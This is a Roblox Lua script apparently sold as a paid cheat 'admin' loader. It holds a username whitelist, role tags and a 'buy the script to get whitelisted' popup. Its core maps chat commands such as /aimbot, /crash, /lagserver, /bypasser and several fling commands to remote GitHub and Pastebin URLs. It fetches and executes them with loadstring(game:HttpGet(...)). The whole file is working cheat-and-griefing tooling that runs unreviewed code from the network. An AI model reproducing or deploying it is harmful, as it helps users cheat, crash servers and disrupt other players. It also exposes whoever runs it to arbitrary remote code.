-- Whitelist configuration
local premiumUsers = {"victorwielki", "rb0zo", "CokeYTXD", "DVXmasters748", "Doritosman2437", "Legalfruad", "rustz7", "6angelzzzz", "bacon_noobyk"}
local GuiMakers = {"victorwielki"}
local Advertisers = {"Vlafz195"}
local Scripters = {"BloxArsenal124"}
local Owners = {"IIIlIIIllIlIllIII", "AliKhammas1234", "AliKhammas"}

-- Check if the script has already been executed
if _G.ScriptExecuted then
    local player = game.Players.LocalPlayer
    local screenGui = Instance.new("ScreenGui", player.PlayerGui)
    local textLabel = Instance.new("TextLabel", screenGui)
    textLabel.Text = "You have already executed the script!"
    textLabel.Size = UDim2.new(0.5, 0, 0.1, 0)
    textLabel.Position = UDim2.new(0.25, 0, 0.45, 0)
    textLabel.BackgroundTransparency = 1
    textLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
    textLabel.TextScaled = true
    textLabel.TextStrokeTransparency = 0.7
    textLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    textLabel.Font = Enum.Font.GothamBold

    -- Ensure notification persists for 5 seconds
    wait(5)
    screenGui:Destroy()
    return
end

-- Function to create and display a popup message with rainbow text color
local function showPopup(player, message)
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "WhitelistPopup"
    screenGui.Parent = player.PlayerGui

    local textLabel = Instance.new("TextLabel")
    textLabel.Name = "PopupLabel"
    textLabel.Text = message
    textLabel.BackgroundTransparency = 1
    textLabel.Size = UDim2.new(0.5, 0, 0.1, 0)
    textLabel.Position = UDim2.new(0.25, 0, 0.45, 0)
    textLabel.TextScaled = true
    textLabel.TextStrokeTransparency = 0.7
    textLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    textLabel.Font = Enum.Font.GothamBold
    textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)

    local uiGradient = Instance.new("UIGradient")
    uiGradient.Color = ColorSequence.new{
        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)), -- Red
        ColorSequenceKeypoint.new(0.2, Color3.fromRGB(255, 127, 0)), -- Orange
        ColorSequenceKeypoint.new(0.4, Color3.fromRGB(255, 255, 0)), -- Yellow
        ColorSequenceKeypoint.new(0.6, Color3.fromRGB(0, 255, 0)), -- Green
        ColorSequenceKeypoint.new(0.8, Color3.fromRGB(0, 0, 255)), -- Blue
        ColorSequenceKeypoint.new(1, Color3.fromRGB(75, 0, 130)) -- Indigo
    }
    uiGradient.Parent = textLabel

    textLabel.Parent = screenGui

    -- Ensure GUI is visible for 5 seconds
    wait(5)
    screenGui:Destroy()
end

-- Function to check if the player is whitelisted
local function isWhitelisted(playerName)
    return table.find(premiumUsers, playerName) or 
           table.find(GuiMakers, playerName) or 
           table.find(Advertisers, playerName) or 
           table.find(Scripters, playerName) or 
           table.find(Owners, playerName)
end

-- Function to create a tag
local function createTag(player, tagName, textColor, strokeColor, font, fontSize)
    local tag = Instance.new("BillboardGui")
    tag.Name = "PlayerTag"
    tag.AlwaysOnTop = true
    tag.Size = UDim2.new(0, 200, 0, 50)
    tag.StudsOffset = Vector3.new(0, 3, 0)
    tag.Adornee = player.Character.Head

    local label = Instance.new("TextLabel")
    label.Name = "TagLabel"
    label.Size = UDim2.new(1, 0, 1, 0)
    label.BackgroundTransparency = 1
    label.Text = tagName
    label.TextColor3 = textColor
    label.TextStrokeTransparency = 0.5
    label.TextStrokeColor3 = strokeColor
    label.Font = font
    label.FontSize = fontSize
    label.Parent = tag

    tag.Parent = player.Character.Head
end

-- Function to attach tags to players based on their roles
local function attachTags()
    for _, username in ipairs(premiumUsers) do
        local player = game.Players:FindFirstChild(username)
        if player and player.Character then
            createTag(player, "AK PREMIUM USER", Color3.new(1, 1, 1), Color3.new(0, 0, 0), Enum.Font.Bangers, Enum.FontSize.Size32)
        end
    end

    for _, username in ipairs(GuiMakers) do
        local player = game.Players:FindFirstChild(username)
        if player and player.Character then
            createTag(player, "AK GUI MAKER", Color3.new(1, 1, 1), Color3.new(0, 98, 255), Enum.Font.Creepster, Enum.FontSize.Size32)
        end
    end

    for _, username in ipairs(Advertisers) do
        local player = game.Players:FindFirstChild(username)
        if player and player.Character then
            createTag(player, "AK ADVERTISER", Color3.new(1, 1, 1), Color3.fromRGB(8, 112, 4), Enum.Font.Gotham, Enum.FontSize.Size32)
        end
    end

    for _, username in ipairs(Scripters) do
        local player = game.Players:FindFirstChild(username)
        if player and player.Character then
            createTag(player, "AK SCRIPTER", Color3.new(1, 1, 1), Color3.fromRGB(168, 52, 235), Enum.Font.Arcade, Enum.FontSize.Size32)
        end
    end

    for _, username in ipairs(Owners) do
        local player = game.Players:FindFirstChild(username)
        if player and player.Character then
            local tag = Instance.new("BillboardGui")
            tag.Name = "PlayerTag"
            tag.AlwaysOnTop = true
            tag.Size = UDim2.new(0, 200, 0, 50)
            tag.StudsOffset = Vector3.new(0, 3, 0)
            tag.Adornee = player.Character.Head

            local label = Instance.new("TextLabel")
            label.Name = "TagLabel"
            label.Size = UDim2.new(1, 0, 1, 0)
            label.BackgroundTransparency = 1
            label.Text = "AK OWNER"
            label.TextColor3 = Color3.new(1, 1, 1)
            label.TextStrokeTransparency = 0.5
            label.TextStrokeColor3 = Color3.new(255, 0, 0)
            label.Font = Enum.Font.Arcade
            label.FontSize = Enum.FontSize.Size32
            label.Parent = tag

            tag.Parent = player.Character.Head

            spawn(function()
                while task.wait() do
                    local t = 5
                    local hue = tick() % t / t
                    local colorrr = Color3.fromHSV(hue, 1, 1)
                    label.TextStrokeColor3 = colorrr
                end
            end)
        end
    end
end

-- Function to execute commands based on player message
local function executeCommand(player, msg)
    local commands = {
        ["/bring"] = "https://raw.githubusercontent.com/Alikhammass/MyAdmin/main/Bring",
        ["/sirius"] = "https://sirius.menu/script",
        ["/lagserver"] = "https://pastebin.com/raw/5YS84U3e",
        ["/antibang"] = "https://pastebin.com/raw/5iSqpqf6",
        ["/chaoshub"] = "https://raw.githubusercontent.com/Vcsk/AstralHub/main/Loader.lua",
        ["/aimbot"] = "https://raw.githubusercontent.com/Alikhammass/MyAdmin/main/aimbot",
        ["/autoreport"] = "https://raw.githubusercontent.com/Alikhammass/MyAdmin/main/report",
        ["/protonadmin"] = "https://raw.githubusercontent.com/Alikhammass/MyAdmin/main/protonadmin",
        ["/triviabooth"] = "https://raw.githubusercontent.com/Alikhammass/MyAdmin/main/triviabooth",
        ["/micupchat"] = "https://raw.githubusercontent.com/UnknownUser2883/NotBypass/main/Haha",
        ["/bbhub"] = "https://raw.githubusercontent.com/Salmon-B0T/SalmonHub/main/SalmonHub.lua",
        ["/getoutmyinv"] = "https://raw.githubusercontent.com/Alikhammass/MyAdmin/main/getoutmyinv",
        ["/anticrash"] = "https://raw.githubusercontent.com/v9h/dhrpvc/main/anticrash.lua",
        ["/kronefling"] = "https://raw.githubusercontent.com/Alikhammass/antifling./main/loopfling",
        ["/gimmetools"] = "https://raw.githubusercontent.com/Alikhammass/MyAdmin/main/gimmetools",
        ["/hub"] = "https://raw.githubusercontent.com/i4mitty/Peruanito.exe/main/Peruanito.exe.lua",
        ["/oof"] = "https://raw.githubusercontent.com/Alikhammass/MyAdmin/main/oof",
        ["/cmds"] = "https://raw.githubusercontent.com/Alikhammass/MyAdmin/main/cmds",
        ["/antilog"] = "https://raw.githubusercontent.com/Alikhammass/MyAdmin/main/antilogger",
        ["/donttouchme"] = "https://raw.githubusercontent.com/0Ben1/fe./main/Fling%20GUI",
        ["/serverhop"] = "https://raw.githubusercontent.com/Alikhammass/emoji/main/serverhop",
        ["/afk"] = "https://raw.githubusercontent.com/2dgeneralspam1/scripts-and-stuff/master/scripts/LoadstringypVvhJBq4QNz",
        ["/ftao"] = "https://raw.githubusercontent.com/BlizTBr/scripts/main/FTAP.lua",
        ["/iy"] = "https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source",
        ["/emoji"] = "https://raw.githubusercontent.com/Alikhammass/emoji/main/emo",
        ["/f3x"] = "https://raw.githubusercontent.com/Alikhammass/antifling./main/F3x",
        ["/bypasser"] = "https://raw.githubusercontent.com/Alikhammass/MyAdmin/main/bypasser",
        ["/bladeball"] = "https://raw.githubusercontent.com/3345-c-a-t-s-u-s/-beta-/main/AutoParry.lua",
        ["/nonofling"] = "https://raw.githubusercontent.com/Alikhammass/antifling./main/Antifling",
        ["/swordreach"] = "https://raw.githubusercontent.com/Alikhammass/emoji/main/swordreach",
        ["/crash"] = "https://raw.githubusercontent.com/Alikhammass/MyAdmin/main/crash",
        ["/byebye all"] = "https://raw.githubusercontent.com/Alikhammass/MyAdmin/main/quickfling",
        ["/pltiger"] = "https://raw.githubusercontent.com/H17S32/Tiger_Admin/main/Tiger%20Admin%203.0",
        ["/fps"] = "https://raw.githubusercontent.com/insanedude59/MiscReleases/main/Roblox/UWPFPSBooster.lua",
        ["/rejoin"] = "https://raw.githubusercontent.com/Alikhammass/MyAdmin/main/rejoin"
    }
    local command = commands[string.lower(msg)]
    if command then
        loadstring(game:HttpGet(command, true))()
    end
end

-- Function to handle player chat messages
local function onPlayerChatted(player, msg)
    if isWhitelisted(player.Name) then
        executeCommand(player, msg)
    end
end

-- Function to handle new and existing players
local function handlePlayer(player)
    if player.Character then
        wait(1)  -- Short delay to ensure the player's character is fully loaded

        -- Prevent multiple notifications
        if player:FindFirstChild("HasBeenNotified") then return end

        -- Mark the player as notified
        local notifiedFlag = Instance.new("BoolValue")
        notifiedFlag.Name = "HasBeenNotified"
        notifiedFlag.Parent = player

        if isWhitelisted(player.Name) then
            showPopup(player, "You are whitelisted!")
        else
            showPopup(player, "You are not whitelisted! Buy the script to get whitelisted.")
        end

        attachTags()
    end
end

-- Connect player added event
game.Players.PlayerAdded:Connect(function(player)
    player.CharacterAdded:Connect(function()
        handlePlayer(player)
    end)

    -- Handle case where player is already in the game
    if player.Character then
        handlePlayer(player)
    end

    -- Listen for chat messages from the player
    player.Chatted:Connect(function(msg)
        onPlayerChatted(player, msg)
    end)
end)

-- Handle existing players when the script runs
for _, player in ipairs(game.Players:GetPlayers()) do
    if not player:FindFirstChild("HasBeenNotified") then
        handlePlayer(player)
    end

    -- Listen for chat messages from existing players
    player.Chatted:Connect(function(msg)
        onPlayerChatted(player, msg)
    end)
end

-- Set the flag to indicate the script has been executed
_G.ScriptExecuted = true
